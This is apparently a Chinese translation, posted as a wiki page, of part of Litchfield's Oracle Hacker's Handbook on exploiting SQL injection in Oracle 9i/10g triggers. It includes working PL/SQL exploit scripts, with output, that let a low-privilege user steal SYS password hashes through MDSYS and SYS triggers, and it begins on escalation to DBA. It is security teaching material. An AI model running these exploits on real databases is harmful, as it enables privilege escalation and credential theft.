href="#%E9%AA%8C%E8%AF%81Oracle-PL-SQL%E7%BD%91%E5%85%B3%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8"><span class="toc-number">4.2.</span> <span class="toc-text">验证Oracle PL&#x2F;SQL网关是否存在</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BBPL-SQL%E7%BD%91%E5%85%B3"><span class="toc-number">4.3.</span> <span class="toc-text">攻击PL&#x2F;SQL网关</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-number">5.</span> <span class="toc-text">执行操作系统命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87PL-SQL%E8%BF%90%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-number">5.1.</span> <span class="toc-text">通过PL&#x2F;SQL运行系统命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87Java%E8%BF%90%E8%A1%8C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-number">5.2.</span> <span class="toc-text">通过Java运行操作系统命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87DBMS-SCHEDULER%E8%BF%90%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-number">5.3.</span> <span class="toc-text">通过DBMS_SCHEDULER运行系统命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87Job-Scheduler%E8%BF%90%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-number">5.4.</span> <span class="toc-text">通过Job Scheduler运行系统命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87ALTER-SYSTEM%E8%BF%90%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-number">5.5.</span> <span class="toc-text">通过ALTER SYSTEM运行系统命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="toc-number">6.</span> <span class="toc-text">访问文件系统</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8UTL-FILE-%E5%8C%85%E8%AE%BF%E9%97%AE%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="toc-number">6.1.</span> <span class="toc-text">使用UTL_FILE 包访问文件系统</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8Java%E8%AE%BF%E9%97%AE%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="toc-number">6.2.</span> <span class="toc-text">使用Java访问文件系统</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6"><span class="toc-number">6.3.</span> <span class="toc-text">访问二进制文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">6.4.</span> <span class="toc-text">使用操作系统环境变量</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E7%BD%91%E7%BB%9C"><span class="toc-number">7.</span> <span class="toc-text">访问网络</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E6%B3%84%E6%BC%8F"><span class="toc-number">7.1.</span> <span class="toc-text">数据泄漏</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-UTL-TCP"><span class="toc-number">7.1.1.</span> <span class="toc-text">使用 UTL_TCP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-UTL-HTTP"><span class="toc-number">7.1.2.</span> <span class="toc-text">使用 UTL_HTTP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-DNS-%E6%9F%A5%E8%AF%A2%E5%92%8C-UTL-INADDR"><span class="toc-number">7.1.3.</span> <span class="toc-text">使用 DNS 查询和 UTL_INADDR</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8%E6%B3%84%E9%9C%B2%E4%B9%8B%E5%89%8D%E5%8A%A0%E5%AF%86%E6%95%B0%E6%8D%AE"><span class="toc-number">7.2.</span> <span class="toc-text">在泄露之前加密数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E7%BD%91%E7%BB%9C%E4%B8%8A%E7%9A%84%E5%85%B6%E4%BB%96%E7%B3%BB%E7%BB%9F"><span class="toc-number">7.3.</span> <span class="toc-text">攻击网络上的其他系统</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java%E5%92%8C%E7%BD%91%E7%BB%9C"><span class="toc-number">7.4.</span> <span class="toc-text">Java和网络</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E9%93%BE%E6%8E%A5"><span class="toc-number">7.5.</span> <span class="toc-text">数据库链接</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%84%E5%BD%95A-%E9%BB%98%E8%AE%A4%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81"><span class="toc-number">8.</span> <span class="toc-text">附录A-默认用户名和密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">9.</span> <span class="toc-text">参考资料</span></a></li></ol>
                </div>
            
        
        
            <p><strong>The  Oracle Hacker’s Handbook: Hacking and Defending Oracle</strong> </p>
<p><strong>by David  Litchfield John Wiley &amp; Sons</strong></p>
<h2 id="触发器（Triggers-）"><a href="#触发器（Triggers-）" class="headerlink" title="触发器（Triggers ）"></a>触发器（Triggers ）</h2><p>在 Oracle 中，触发器是执行某些任务并在给定事件发生时自动触发的 PL/SQL 代码片段。可以为各种事件创建触发器，包括 DML 操作，如 INSERT、DELETE 和 UPDATE；并且它们可以设置为在事件之前或之后触发。触发器也可以定义为事件，例如用户登录、用户被删除或表被截断——换句话说，为所有类型的事件。当涉及到触发器时，有几个关键点需要记住。</p>
<p>首先，触发器以定义它的用户的权限执行。其次，就本章而言，可能更重要的是，就像任何 PL/SQL 对象一样，触发器可能容易受到攻击。在查看实际示例之前，查看一个人为的 SQL 注入示例会很有启发性。对于此示例，我们创建了两个表：一个称为 MYTABLE 以保存短字符串，另一个称为 MYTABLE_LONG 以保存长度超过 15 个字符的字符串的副本。然后我们在 MYTABLE 上创建一个触发器以在插入之前触发，这样如果有人试图将长度超过 15 个字符的字符串插入到 MYTABLE 中，副本也会存储在 MYTABLE_LONG 中。这个例子除了证明这一点之外毫无用处：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; CONNECT SCOTT/TIGER</span><br><span class="line">Connected.</span><br><span class="line">SQL&gt; SET SERVEROUTPUT ON</span><br><span class="line">SQL&gt; CREATE TABLE MYTABLE (V VARCHAR2(200));</span><br><span class="line"></span><br><span class="line">Table created.</span><br><span class="line"></span><br><span class="line">SQL&gt; CREATE TABLE MYTABLE_LONG (V VARCHAR2(200));</span><br><span class="line"></span><br><span class="line">Table created.</span><br><span class="line"></span><br><span class="line">SQL&gt; CREATE OR REPLACE TRIGGER MYTRIGGER BEFORE INSERT ON MYTABLE</span><br><span class="line">  2  REFERENCING NEW AS NEWROW</span><br><span class="line">  3  FOR EACH ROW</span><br><span class="line">  4  DECLARE</span><br><span class="line">  5  L NUMBER;</span><br><span class="line">  6  S VARCHAR2(2000);</span><br><span class="line">  7  BEGIN</span><br><span class="line">  8  L:=LENGTH(:NEWROW.V);</span><br><span class="line">  9  IF L &gt; 15 THEN</span><br><span class="line"> 10     DBMS_OUTPUT.PUT_LINE(&#x27;INSERTING INTO MYTABLE_LONG AS WELL&#x27;);</span><br><span class="line"> 11     S:=&#x27;INSERT INTO MYTABLE_LONG (V) VALUES (&#x27;&#x27;&#x27; || :NEWROW.V ||</span><br><span class="line">&#x27;&#x27;&#x27;)&#x27;;</span><br><span class="line"> 12     EXECUTE IMMEDIATE S;</span><br><span class="line"> 13  END IF;</span><br><span class="line"> 14  END MYTRIGGER;</span><br><span class="line"> 15 /</span><br><span class="line"></span><br><span class="line">Trigger created.</span><br><span class="line"></span><br><span class="line">SQL&gt; SHOW ERRORS</span><br><span class="line">No errors.</span><br><span class="line">SQL&gt; INSERT INTO MYTABLE (V) VALUES (&#x27;Hello, world!&#x27;);</span><br><span class="line"></span><br><span class="line">1 row created.</span><br><span class="line"></span><br><span class="line">SQL&gt; INSERT INTO MYTABLE (V) VALUES (&#x27;Hello, world! More text...&#x27;);</span><br><span class="line">INSERTING INTO MYTABLE_LONG AS WELL</span><br><span class="line"></span><br><span class="line">1 row created.</span><br><span class="line"></span><br><span class="line">SQL&gt; INSERT INTO MYTABLE (V) VALUES</span><br><span class="line">(&#x27;__________INJECT&#x27;&#x27;POINT__________&#x27;);</span><br><span class="line">INSERTING INTO MYTABLE_LONG AS WELL</span><br><span class="line">INSERT INTO MYTABLE (V) VALUES (&#x27;__________INJECT&#x27;&#x27;POINT__________&#x27;)</span><br><span class="line">*</span><br><span class="line">ERROR at line 1:</span><br><span class="line">ORA-00917: missing comma</span><br><span class="line">ORA-06512: at &quot;SCOTT.MYTRIGGER&quot;, line 9</span><br><span class="line">ORA-04088: error during execution of trigger &#x27;SCOTT.MYTRIGGER&#x27;</span><br></pre></td></tr></table></figure>

<p>如果您查看触发器的文本，您会发现它容易受到 SQL 注入的攻击。 它获取用户在 INSERT 中提供的值，然后将其连接到另一个 INSERT 语句； 然后触发器执行新的 INSERT 语句：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">S:=&#x27;INSERT INTO MYTABLE_LONG (V) VALUES (&#x27;&#x27;&#x27; || :NEWROW.V || &#x27;&#x27;&#x27;)&#x27;;</span><br><span class="line"></span><br><span class="line">EXECUTE IMMEDIATE S;</span><br></pre></td></tr></table></figure>

<p>最后一条INSERT语句的结果是错误，说明触发器确实存在SQL注入漏洞。</p>
<h3 id="利用MDSYS-SDO-GEOM-TRIG-INS1-和-SDO-GEOM-TRIG-INS1触发器"><a href="#利用MDSYS-SDO-GEOM-TRIG-INS1-和-SDO-GEOM-TRIG-INS1触发器" class="headerlink" title="利用MDSYS.SDO_GEOM_TRIG_INS1 和 SDO_GEOM_TRIG_INS1触发器"></a>利用MDSYS.SDO_GEOM_TRIG_INS1 和 SDO_GEOM_TRIG_INS1触发器</h3><p>在 9i 和 10g 的早期版本中，10g 拥有的 SDO_GEOM_TRIG_INS1 触发器很容易受到 SQL 注入的攻击，这与上一节中显示的示例类似。 当对 USER_SDO_GEOM_METADATA 表执行 INSERT 时触发触发器，该表再次归 MDSYS 所有。 由于 PUBLIC 有权插入此表，因此任何人都可以触发触发器。 触发器执行以下 PL/SQL：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">..</span><br><span class="line">..</span><br><span class="line">EXECUTE IMMEDIATE</span><br><span class="line">&#x27;SELECT user FROM dual&#x27; into tname;</span><br><span class="line">stmt :=  &#x27;SELECT count(*) FROM SDO_GEOM_METADATA_TABLE &#x27; ||</span><br><span class="line">&#x27;WHERE sdo_owner = &#x27;&#x27;&#x27; || tname || &#x27;&#x27;&#x27; &#x27; ||</span><br><span class="line">&#x27;  AND sdo_table_name = &#x27;&#x27;&#x27; || :n.table_name || &#x27;&#x27;&#x27; &#x27;||</span><br><span class="line">&#x27;  AND  sdo_column_name = &#x27;&#x27;&#x27; || :n.column_name || &#x27;&#x27;&#x27;  &#x27;;</span><br><span class="line">..</span><br><span class="line">..</span><br></pre></td></tr></table></figure>

<p>在这里， :new.table_name 和 :new.column_name 会受到用户和注入的 SQL 的影响。 PUBLIC 有权插入此表。 因此，触发器可以被滥用以将 SQL 作为 MDSYS 运行。 例如，低权限用户可以从 USER$ 表中选择 SYS 的密码哈希：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">set serveroutput on</span><br><span class="line">create or replace function y return varchar2 authid current_user is</span><br><span class="line">buffer varchar2(30);</span><br><span class="line">stmt varchar2(200):=&#x27;select password from sys.user$ where name</span><br><span class="line">=&#x27;&#x27;SYS&#x27;&#x27;&#x27;;</span><br><span class="line">begin</span><br><span class="line">execute immediate stmt into buffer;</span><br><span class="line">dbms_output.put_line(&#x27;SYS passord is: &#x27;|| buffer);</span><br><span class="line">return &#x27;foo&#x27;;</span><br><span class="line">end;</span><br><span class="line">/</span><br><span class="line">grant execute on y to public;</span><br><span class="line">insert into mdsys.user_sdo_geom_metadata (table_name,column_name) values</span><br><span class="line">(&#x27;X&#x27;&#x27; AND SDO_COLUMN_NAME=scott.y--&#x27;,&#x27;test&#x27;);</span><br><span class="line"></span><br><span class="line">returns</span><br><span class="line"></span><br><span class="line">SYS passord is: D9CF6D3630046AC9</span><br><span class="line"></span><br><span class="line">1 row created.</span><br></pre></td></tr></table></figure>

<p>SDO_GEOM_TRIG_INS1 触发器也由 MDSYS 拥有，以非常相似的方式易受攻击。 当在 MDSYS.USER_SDO_LRS_METADATA 上发生 INSERT 时触发此触发器，并执行以下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">..</span><br><span class="line">stmt := &#x27;SELECT count(*) FROM SDO_LRS_METADATA_TABLE &#x27; ||</span><br><span class="line">&#x27; WHERE sdo_owner = &#x27;&#x27;&#x27;  || UPPER(user_name) || &#x27;&#x27;&#x27; &#x27; ||</span><br><span class="line">&#x27;  AND  sdo_table_name = &#x27;&#x27;&#x27;  || UPPER(:n.table_name) || &#x27;&#x27;&#x27; &#x27; ||</span><br><span class="line">&#x27;  AND  sdo_column_name = &#x27;&#x27;&#x27; || UPPER(:n.column_name) || &#x27;&#x27;&#x27; &#x27;;</span><br><span class="line">EXECUTE IMMEDIATE stmt INTO vcount;</span><br><span class="line">..</span><br><span class="line">..</span><br></pre></td></tr></table></figure>

<h3 id="利用MDSYS-SDO-CMT-CBK-TRIG触发器"><a href="#利用MDSYS-SDO-CMT-CBK-TRIG触发器" class="headerlink" title="利用MDSYS SDO_CMT_CBK_TRIG触发器"></a>利用MDSYS SDO_CMT_CBK_TRIG触发器</h3><p>MDSYS 拥有的 SDO_CMT_CBK_TRIG 触发器在对 SDO_TXN_IDX_INSERTS 表（也由 MDSYS 拥有）执行 DELETE 时触发。 PUBLIC 对该表具有 SELECT、INSERT、UPDATE 和 DELETE 对象权限。 因此，任何人都可以通过从表中删除一行来触发 SDO_CMT_CBK_TRIG 触发器。 这个触发器不容易受到 SQL 注入的攻击，而是一个更有趣和微妙的漏洞。 这会影响 9i 和 10g 的早期版本。  解释变得有点详细和复杂。</p>
<p>如果您检查触发器的文本，您可以看到在 DELETE 实际发生之前，会从 SDO_CMT_DBK_FN_TABLE 和 SDO_CMT_CBK_DML_TABLE 表中选择一个函数列表，然后执行这些函数。</p>
<p>如果攻击者能够以某种方式在这些表中列出他们自己的函数，那么它们也会在触发器触发时被执行。 PUBLIC 没有为这些表中的任何一个设置对象权限，因此它们不能直接插入自己的函数名称。但是，MDSYS 拥有的 PRVT_CMT_CBK 包有两个过程，CCBKAPPLROWTRIG 和 EXEC_CBK_FN_DML，它们将模式和函数名称作为参数，然后插入到 SDO_CMT_DBK_FN_TABLE 和 SDO_CMT_CBK_DML_TABLE 表中。 PUBLIC 对 PRVT_CMT_CBK 包具有 EXECUTE 权限，并且因为它没有用 ‘AUTHID CURRENT_USER’ 关键字定义，所以包使用 MDSYS的定义者而不是调用者的权限执行。因此，任何人都可以将函数名间接插入到 SDO_CMT_DBK_FN_TABLE 和 SDO_CMT_CBK_DML_TABLE 表中。因此，当 SDO_TXN_IDX_INSERTS 上发生 DELETE 时，任何人都可以影响 SDO_CMT_CBK_TRIG 触发器采取的操作 - 换句话说，任何人都可以获得触发器来执行任意函数。更重要的是，这个函数在触发器中执行时，将以 MDSYS 的权限运行，攻击者可以利用它来获得提升的权限。</p>
<p>此示例脚本将由 SCOTT 等低权限用户运行，将获取 SYS 帐户的密码哈希。 为此，它首先创建一个名为 USERS_AND_PASSWORDS 的表。 此表是 SYS 帐户的密码哈希结束的位置。 然后创建函数 GET_USERS_AND_PWDS。 这是攻击者放置他们的 SQL 漏洞利用代码的地方。 在这种情况下，该函数利用 MDSYS 具有 SELECT ANY TABLE 特权从 USER$ 表中选择 SYS 的密码哈希这一事实。 创建表和函数后，PUBLIC 就可以访问它们。 这使 MDSYS 能够访问它们。 在此之后，执行 MDSYS.PRVT_CMT_CBK.CCBKAPPLROWTRIG 和 MDSYS.PRVT_CMT_CBK.EXEC_CBK_FN_DML 过程，将模式 SCOTT 和函数 GET_USERS_AND_PWDS 插入到 SDO_CMT_DBK_FN_TABLE 和 SDO_CMT_CBK 表中。</p>
<p>一切就绪后，将一行插入到 SDO_TXN_IDX_INSERTS 中，然后删除。 当删除发生时，触发器被触发，它检索 SCOTT.GET_USERS_AND_PWDS 函数，然后执行它。 当函数执行时，SYS 的密码哈希从 SYS.USER$ 中选择，然后插入到 SCOTT 的 USERS_AND_PASSWORDS 表中。 最后，SCOTT 从表中选择散列，然后将其输入到他的 Oracle 密码破解程序中。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE USERS_AND_PASSWORDS (USERNAME VARCHAR2(200), PASSWORD</span><br><span class="line">VARCHAR2(200));</span><br><span class="line">/</span><br><span class="line">GRANT SELECT ON USERS_AND_PASSWORDS TO PUBLIC;</span><br><span class="line">GRANT INSERT ON USERS_AND_PASSWORDS TO PUBLIC;</span><br><span class="line">CREATE OR REPLACE FUNCTION GET_USERS_AND_PWDS(DUMMY1 VARCHAR2, DUMMY2</span><br><span class="line">VARCHAR2) RETURN NUMBER AUTHID CURRENT_USER IS</span><br><span class="line">BEGIN</span><br><span class="line">      EXECUTE IMMEDIATE &#x27;INSERT INTO SCOTT.USERS_AND_PASSWORDS</span><br><span class="line">(USERNAME,PASSWORD) VALUES ((SELECT NAME FROM SYS.USER$ WHERE NAME =</span><br><span class="line">&#x27;&#x27;SYS&#x27;&#x27;),(SELECT PASSWORD FROM SYS.USER$ WHERE NAME = &#x27;&#x27;SYS&#x27;&#x27;))&#x27;;</span><br><span class="line">      RETURN 1;</span><br><span class="line">END;</span><br><span class="line">/</span><br><span class="line">GRANT EXECUTE ON GET_USERS_AND_PWDS TO PUBLIC;</span><br><span class="line">EXEC MDSYS.PRVT_CMT_CBK.CCBKAPPLROWTRIG(&#x27;SCOTT&#x27;,&#x27;GET_USERS_AND_PWDS&#x27;);</span><br><span class="line">EXEC</span><br><span class="line">MDSYS.PRVT_CMT_CBK.EXEC_CBK_FN_DML(0,&#x27;AAA&#x27;,&#x27;BBB&#x27;,&#x27;SCOTT&#x27;,&#x27;GET_USERS_AND_</span><br><span class="line">PWDS&#x27;);</span><br><span class="line">INSERT INTO MDSYS.SDO_TXN_IDX_INSERTS (SDO_TXN_IDX_ID,RID)</span><br><span class="line">VALUES(&#x27;FIRE&#x27;,&#x27;FIRE&#x27;);</span><br><span class="line">DELETE FROM MDSYS.SDO_TXN_IDX_INSERTS WHERE SDO_TXN_IDX_ID = &#x27;FIRE&#x27;;</span><br><span class="line">SELECT * FROM USERS_AND_PASSWORDS;</span><br></pre></td></tr></table></figure>

<p><img src="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8B%E7%AF%87/8.png"></p>
<h3 id="利用SYS-CDC-DROP-CTABLE-BEFORE触发器"><a href="#利用SYS-CDC-DROP-CTABLE-BEFORE触发器" class="headerlink" title="利用SYS.CDC_DROP_CTABLE_BEFORE触发器"></a>利用SYS.CDC_DROP_CTABLE_BEFORE触发器</h3><p>SYS 拥有的 10g 第 2 版上的 CDC_DROP_CTABLE_BEFORE 触发器容易受到 SQL 注入的攻击。 （默认情况下，10g 第 1 版不易受到攻击，因为虽然触发器存在，但并未启用。）每当删除表时，触发器就会触发，并执行 sys.dbms_cdc_ipublish.change_table_trigger 过程。 此过程调用 ChangeTable Trigger Java 方法，该方法执行以下 SQL：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String sqltext = &quot;SELECT COUNT(*) FROM SYS.CDC_CHANGE_TABLES$ WHERE</span><br><span class="line">CHANGE_TABLE_SCHEMA=&#x27;&quot; + schema + &quot;&#x27; AND CHANGE_TABLE_NAME=&#x27;&quot; +</span><br><span class="line">tableName + &quot;&#x27;&quot;;</span><br></pre></td></tr></table></figure>

<p>由于通过使用嵌入式 SQL 创建表名，将要删除的表的名称逐字放入此 SELECT 查询中，因此我们可以以 SYS 身份执行 SQL：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; connect scott/tiger</span><br><span class="line">Connected.</span><br><span class="line">SQL&gt; set serveroutput on</span><br><span class="line">SQL&gt; -- create the function we&#x27;re going to inject</span><br><span class="line">SQL&gt; create or replace function gp return varchar2 authid current_user</span><br><span class="line">SQL&gt; is</span><br><span class="line">  2 STMT VARCHAR2(400):= &#x27;select password from dba_users where username</span><br><span class="line">= &#x27;&#x27;SYS&#x27;&#x27;&#x27;;</span><br><span class="line">  3  P VARCHAR2(200);</span><br><span class="line">  4  BEGIN</span><br><span class="line">  5  EXECUTE IMMEDIATE STMT INTO P;</span><br><span class="line">  6  dbms_output.put_line(&#x27;SYS password is &#x27;|| P);</span><br><span class="line">  7  RETURN &#x27;SUCCESS&#x27;;</span><br><span class="line">  8  END;</span><br><span class="line">  9  /</span><br><span class="line"></span><br><span class="line">Function created.</span><br><span class="line"></span><br><span class="line">SQL&gt; GRANT EXECUTE ON GP TO PUBLIC;</span><br><span class="line"></span><br><span class="line">Grant succeeded.</span><br><span class="line"></span><br><span class="line">SQL&gt; -- create a table with our function name embedded</span><br><span class="line">SQL&gt; create table &quot;O&#x27;||SCOTT.GP||&#x27;O&quot; (x number);</span><br><span class="line"></span><br><span class="line">Table created.</span><br><span class="line"></span><br><span class="line">SQL&gt; -- now drop the table and cause the trigger to fire</span><br><span class="line">SQL&gt; drop table &quot;O&#x27;||SCOTT.GP||&#x27;O&quot;;</span><br><span class="line"></span><br><span class="line">SYS password is B747B510C5F70DED</span><br></pre></td></tr></table></figure>

<h3 id="利用MDSYS-SDO-DROP-USER-BEFORE触发器"><a href="#利用MDSYS-SDO-DROP-USER-BEFORE触发器" class="headerlink" title="利用MDSYS.SDO_DROP_USER_BEFORE触发器"></a>利用MDSYS.SDO_DROP_USER_BEFORE触发器</h3><p>在 10g 第 2 版中，MDSYS 拥有的 SDO_DROP_USER_BEFORE 触发器容易受到 SQL 注入攻击。 但是，在 10g 第 2 版中，MDSYS 没有那么多权限，而它是 Oracle 9i 中的 DBA。 这给我们带来了一个重要的问题，也是一个完美的地方来完成本章并继续下一章：当您所利用的东西的所有者不是 DBA 时，如何获得 DBA 特权？ 您将在下一章中学习如何执行此操作。</p>
<h2 id="间接特权提升"><a href="#间接特权提升" class="headerlink" title="间接特权提升"></a>间接特权提升</h2><p>在非 DBA 用户拥有的代码中存在错误的情况下会发生什么？ 是否仍有可能利用该漏洞并获得 DBA 权限？ 嗯，答案取决于多种因素，例如易受攻击的用户实际拥有的特权。 在本章中，我们将研究如何滥用某些权限来获得 DBA 权限； 而且，正如您将看到的，有些比其他更容易。 从上一章继续，我们将首先查看 CREATE ANY TRIGGER 权限。 事实上，许多 CREATE ANY 特权意味着您离 DBA 特权仅一步之遥，但您还将看到，即使只是 CREATE PROCEDURE 特权也常常会导致 DBA。</p>
<h3 id="从CREATE-ANY-TRIGGER获取DBA"><a href="#从CREATE-ANY-TRIGGER获取DBA" class="headerlink" title="从CREATE ANY TRIGGER获取DBA"></a>从CREATE ANY TRIGGER获取DBA</h3><p>使用上一章中的示例，假设您有一个帐户 MDSYS，该帐户拥有一个容易受到 SQL 注入攻击的触发器。 在 10g 第 2 版中，MDSYS 不是 DBA，但它确实具有 CREATE ANY TRIGGER 系统特权。 这可以用来获得 DBA 权限。 您可能已经猜到或已经知道，CREATE ANY TRIGGER 权限允许被授权者在任何模式中创建触发器，唯一的限制是触发器不能放置在 SYS 拥有的对象上。 从 CREATE ANY TRIGGER 到 DBA 的过程如下。</p>
<p>首先，您确定谁是系统上的 DBA 以及他们拥有哪些表或视图，PUBLIC 可以从哪些表或视图中插入、更新或删除。 SYSTEM 用户提供了一个很好的例子。 默认情况下，它是一个 DBA，它拥有许多 PUBLIC 可以对其执行 DML 操作的表。 一旦找到 DBA，您就可以在他们的模式中为该表创建一个触发器，然后执行设置为触发它的 DML 操作。 触发器里面的东西是关键，因为触发器以所有者的权限执行； 在 SYSTEM 的情况下，您需要获取触发器来执行您创建为 AUTHID CURRENT_USER 的过程。 您可以做任何您想做的事情，因为 SYSTEM 会进入此过程。 让我们看一下 MDSYS 示例。</p>
<p>MDSYS.SDO_DROP_USER_BEFORE 触发器在执行 drop user 命令时执行。 此外，由于触发器是“之前”触发器 - 因此在采取任何操作之前触发 - 被删除的用户不一定存在，并且发出命令的用户不必具有删除用户的权限 。因此，任何人都可以发出 DROP USER FOO 并且触发器将在后台触发。 如果您查看 SDO_DROP_USER_BEFORE 触发器，您可以看到它执行以下操作：</p>
